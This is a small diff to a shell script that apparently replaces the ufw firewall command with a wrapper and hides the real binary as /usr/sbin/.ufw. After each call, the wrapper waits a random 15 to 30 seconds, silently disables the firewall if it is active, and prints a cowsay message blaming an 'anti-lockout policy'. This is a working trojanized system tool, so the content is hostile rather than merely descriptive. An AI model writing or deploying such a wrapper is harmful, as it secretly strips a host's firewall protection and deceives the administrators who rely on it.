@@ -16,13 +16,13 @@ sudo apt install cowsay -y
 
 SCRIPT="#!/bin/bash
 
-/usr/sbin/.ufw \$@
+sudo /usr/sbin/.ufw \$@
 
 sleep \$((15 + \$RANDOM % 15)) && \
 if ! /usr/sbin/.ufw status | grep -qw \"active\"; then exit 0; fi && \
-/usr/sbin/.ufw disable > /dev/null && \
+sudo /usr/sbin/.ufw disable > /dev/null && \
 echo \"\" && \
-cowsay \"Firewall disabled due to anti-lockout policy!\" &
+sudo su -c \"cowsay \\\"Firewall disabled due to anti-lockout policy!\\\"\" &
 "
 
 sudo mv /usr/sbin/ufw /usr/sbin/.ufw
